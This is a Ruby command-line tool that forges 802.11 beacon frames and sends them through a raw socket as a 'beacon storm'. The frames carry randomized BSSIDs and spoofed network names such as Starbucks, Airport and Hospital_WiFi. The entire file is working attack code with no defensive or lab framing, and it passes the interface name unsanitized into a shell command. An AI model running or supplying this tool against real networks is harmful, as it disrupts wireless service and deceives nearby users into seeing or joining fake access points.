#!/usr/bin/env ruby
# frozen_string_literal: true

require 'socket'
require 'json'
require 'time'
require 'securerandom'

ETH_P_ALL = [0x0003].pack('n').unpack1('S')

def mac2bin(s)
  s.split(':').map { |b| b.to_i(16).chr }.join
end

def if_nametoindex(name)
  Socket.getifaddrs.select { |a| a.name == name }.first&.ifindex
end

def random_mac
  mac = (1..6).map { rand(0..255) }
  mac[0] = (mac[0] & 0xfe) | 0x02
  mac.map { |b| format('%02x', b) }.join(':')
end

def build_beacon(ssid, bssid, channel)
  fc = [0x80, 0x00].pack('C*')
  dur = [0x0000].pack('v')
  da = "\xff\xff\xff\xff\xff\xff"
  sa = bssid
  bssid_f = bssid
  sc = [rand(0..4095) << 4].pack('v')
  ts = [0].pack('Q<')
  interval = [0x0064].pack('v')
  cap = [0x2101].pack('v')
  ssid_el = [0x00, ssid.bytesize].pack('CC') + ssid
  rates = [0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24].pack('C*')
  rates_el = [0x01, 8].pack('CC') + rates
  ds_el = [0x03, 0x01, channel].pack('CCC')
  rsn = [0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00].pack('C*')
  rsn_el = [0x30, rsn.bytesize].pack('CC') + rsn
  body = ts + interval + cap + ssid_el + rates_el + ds_el + rsn_el
  fc + dur + da + sa + bssid_f + sc + body
end

begin
  iface = ARGV[0]
  channel = (ARGV[1] || 1).to_i
  count = (ARGV[2] || 50).to_i
  ssid_file = ARGV[3] || ''
  _bssid_base = ARGV[4] || '00:11:22:33:44:55'

  raise 'interface required' unless iface
  ifidx = if_nametoindex(iface)
  raise "interface #{iface} not found" unless ifidx

  ssids = if !ssid_file.empty? && File.exist?(ssid_file)
    File.readlines(ssid_file).map(&:strip).reject(&:empty?)
  else
    %w[FreeWiFi Starbucks ATT_WiFi Xfinity Cafe_NET Guest Corporate
       IoT_Network 5G_Hotspot Mesh_AP Library Airport Hotel Campus Hospital_WiFi]
  end

  security_types = %w[WPA2 WPA3 OPEN]

  puts JSON.generate({ event: 'storm_start', iface: iface,
    data: { ssid_count: ssids.size, channel: channel, count: count },
    timestamp: Time.now.iso8601 })
  $stdout.flush

  system("iw dev #{iface} set channel #{channel} 2>/dev/null")

  sock = Socket.new(Socket::PF_PACKET, Socket::SOCK_RAW, ETH_P_ALL)
  sock.setsockopt(Socket::SOL_SOCKET, Socket::SO_SNDBUF, 131_072)
  total_sent = 0

  count.times do |i|
    ssids.each do |ssid|
      mac = mac2bin(random_mac)
      frame = build_beacon(ssid, mac, channel)
      addr = Socket.pack_sockaddr_ll(ETH_P_ALL, ifidx, 0, 0, 0, '')
      sock.send(frame, 0, addr)
      total_sent += 1
    end
    if (i + 1) % 5 == 0
      puts JSON.generate({ event: 'beacon_sent', iface: iface,
        data: { method: 'raw', iteration: i + 1, total: count, frames: total_sent },
        timestamp: Time.now.iso8601 })
      $stdout.flush
    end
    sleep(0.01)
  end

  sock.close
  puts JSON.generate({ event: 'storm_complete', iface: iface,
    data: { method: 'raw', total_frames: total_sent, ssids_used: ssids.size },
    timestamp: Time.now.iso8601 })
  $stdout.flush

rescue Interrupt
  puts JSON.generate({ event: 'storm_interrupted', iface: iface || '',
    data: { status: 'interrupted', sent: total_sent || 0 },
    timestamp: Time.now.iso8601 })
rescue => e
  $stderr.puts JSON.generate({ event: 'error', data: { message: e.message,
    backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601 })
  exit 1
end
